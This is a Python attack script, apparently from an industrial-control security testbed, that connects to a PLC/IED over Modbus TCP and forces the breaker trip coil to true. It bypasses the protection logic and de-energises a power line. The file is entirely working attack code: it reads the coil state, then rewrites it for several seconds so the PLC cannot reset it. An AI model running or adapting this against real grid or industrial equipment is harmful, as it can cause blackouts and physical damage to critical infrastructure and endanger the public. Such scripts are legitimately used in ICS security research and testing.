#!/usr/bin/env python3
"""
ATK-03 | Rogue Breaker Trip
============================
This attack bypasses the IED's Structured-Text protection logic entirely and
writes directly to the PLC output coil (%QX0.0 = Coil address 0).

In the normal flow the PLC evaluates sensor data and then *sets* this coil to
command a breaker trip.  Here we set it ourselves — no fault condition, no
threshold crossed — just a raw coil write.  The breaker opens immediately and
the attached line is de-energised, causing an unexpected blackout.

Register map
------------
  Coil 0  (%QX0.0)  —  Trip_Command
    Normal closed breaker : coil = False (0)
    After this attack     : coil = True  (1)  ← breaker trips, line opens

Usage
-----
    python atk03_rogue_breaker_trip.py
    python atk03_rogue_breaker_trip.py --target 127.0.0.1 --port 5020 --coil 0
"""
import argparse
import time
from pymodbus.client import ModbusTcpClient


def main():
    parser = argparse.ArgumentParser(
        description="ATK-03: Write directly to the PLC output coil to force a breaker trip."
    )
    parser.add_argument("--target",   type=str, default="127.0.0.1",
                        help="Target IED IP address")
    parser.add_argument("--port",     type=int, default=5020,
                        help="Target IED Modbus TCP port  (default 5020 = IED-1)")
    parser.add_argument("--coil",     type=int, default=0,
                        help="Coil address to write  (default 0 = %QX0.0 Trip_Command)")
    parser.add_argument("--sustain",  type=float, default=5.0,
                        help="Seconds to keep hammering the coil so PLC scan can't reset it")
    args = parser.parse_args()

    print("=" * 60)
    print("  ATK-03  |  Rogue Breaker Trip")
    print("=" * 60)
    print(f"[*] Target IED   : {args.target}:{args.port}")
    print(f"[*] Output coil  : address {args.coil}  (%QX0.0 = Trip_Command)")
    print(f"[*] Sustain time : {args.sustain} s")
    print()

    client = ModbusTcpClient(args.target, port=args.port)
    if not client.connect():
        print("[-] FAILED: Could not connect. Is the IED container running?")
        return

    # First read — confirm breaker is initially CLOSED (coil False)
    read_result = client.read_coils(args.coil, count=1)
    if not read_result.isError():
        current_state = read_result.bits[0]
        print(f"[*] Current coil state: {'OPEN (tripped)' if current_state else 'CLOSED (normal)'}")
    else:
        print("[!] Could not read coil state — proceeding anyway.")

    print(f"\n[*] Forcing coil {args.coil} → TRUE (trip command) …")
    deadline  = time.time() + args.sustain
    iteration = 0

    try:
        while time.time() < deadline:
            response = client.write_coil(args.coil, True)
            if response.isError():
                print(f"[-] Coil write error on iteration {iteration}: {response}")
                break
            iteration += 1
            time.sleep(0.05)

        print(f"\n[+] ATTACK COMPLETE: Rogue trip sustained for {args.sustain} s ({iteration} writes)")
        print("[+] Breaker should be OPEN — line de-energised without any real fault.")
        print("[+] Check the SCADA dashboard for the blackout indicator.")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
    except Exception as e:
        print(f"[-] Exception: {e}")
    finally:
        client.close()
        print("[*] Modbus connection closed.")


if __name__ == "__main__":
    main()
